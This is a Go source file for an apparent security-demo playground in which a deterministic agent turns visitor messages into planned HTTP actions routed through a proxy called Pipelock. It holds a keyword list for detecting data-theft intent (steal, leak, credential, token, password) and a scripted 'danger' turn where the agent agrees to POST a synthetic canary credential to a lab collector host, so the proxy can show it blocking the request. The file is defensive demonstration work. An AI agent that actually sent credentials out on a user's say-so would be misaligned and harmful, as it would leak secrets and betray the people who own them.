// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package playground

import (
	"net/http"
	"strings"
)

// LiveAgent maps a visitor's chat message to the agent's reply and the HTTP
// actions it will attempt. It performs NO I/O: the live session executes the
// planned actions through the Pipelock proxy so the session controls stream
// ordering (chat -> action -> signed decision).
//
// The shipped implementation (IntentAgent) is DETERMINISTIC: a visitor message
// only SELECTS among a fixed set of pre-authored lab intents; it is never
// executed as instructions. That is why IntentAgent is safe to run in-process
// with the server. A future LLM-backed agent — which can be jailbroken into
// arbitrary actions — MUST instead run as the kernel-contained subprocess, and
// must not be run in-process. Keep that boundary when adding a new LiveAgent.
type LiveAgent interface {
	Plan(msg string) AgentTurn
}

// AgentTurn is the agent's response to one message: a chat reply plus the
// actions it will attempt.
type AgentTurn struct {
	// Reply is the agent's chat message (rendered in the Chat column, role=agent).
	Reply string
	// Danger marks the turn as the manipulation/"the turn" beat for display.
	Danger bool
	// Actions are the HTTP requests the agent will issue, in order.
	Actions []AgentAction
}

// AgentAction is one HTTP request the agent will attempt through the proxy.
type AgentAction struct {
	// Kind is a display class: "blue" (benign) or "danger" (exfil attempt).
	Kind string
	// Act is a short tag, e.g. "fetch lab config".
	Act string
	// Title is a one-line human description.
	Title string
	// Note is an optional sub-line.
	Note string
	// Method and URL are the request to issue.
	Method string
	URL    string
	// Body is the request body (the canary exfil POST carries the inert canary).
	Body []byte
}

// Display kinds for agent actions.
const (
	agentKindBenign = "blue"
	agentKindDanger = "danger"
)

// IntentAgent is the deterministic reference LiveAgent. It classifies a message
// into one of a small set of lab intents and returns the corresponding planned
// action. Every action targets a reserved .test lab host through the proxy.
type IntentAgent struct {
	safeURL  string
	exfilURL string
	canary   string
}

// NewIntentAgent builds the reference agent. safeURL/exfilURL are the lab target
// URLs (already carrying the live run's ephemeral ports); canary is the inert
// synthetic credential the agent "holds" and may try to exfiltrate.
func NewIntentAgent(safeURL, exfilURL, canary string) *IntentAgent {
	return &IntentAgent{safeURL: safeURL, exfilURL: exfilURL, canary: canary}
}

// exfilKeywords signal an intent to send/leak data outward. Matching any one
// routes the agent to the canary-exfil POST (which Pipelock blocks via body DLP).
var exfilKeywords = []string{
	"exfil", "send", "post", "upload", "leak", "steal", "copy",
	"collector", "ship", "transmit", "forward", "share", "email",
	"credential", "secret", "token", "key", "password", "dump", "out",
}

// Plan maps the message to an agent turn. Default (no exfil intent) is a benign
// lab read, which Pipelock allows.
func (a *IntentAgent) Plan(msg string) AgentTurn {
	if a.wantsExfil(msg) {
		return AgentTurn{
			Reply:  "On it — sending the contents over to the collector.",
			Danger: true,
			Actions: []AgentAction{{
				Kind:   agentKindDanger,
				Act:    "exfiltrate",
				Title:  "POST the file to the collector",
				Note:   "from your message · carries the credential",
				Method: http.MethodPost,
				URL:    a.exfilURL,
				// The inert synthetic canary, wrapped so body DLP sees a
				// credential class — exactly what the proxy must block.
				Body: []byte("file_contents=config\ncanary=" + a.canary + "\n"),
			}},
		}
	}
	return AgentTurn{
		Reply: "Sure — pulling the lab config now.",
		Actions: []AgentAction{{
			Kind:   agentKindBenign,
			Act:    "fetch lab config",
			Title:  "GET the lab config",
			Note:   "from your message · benign read",
			Method: http.MethodGet,
			URL:    a.safeURL,
		}},
	}
}

func (a *IntentAgent) wantsExfil(msg string) bool {
	lower := strings.ToLower(msg)
	for _, kw := range exfilKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}
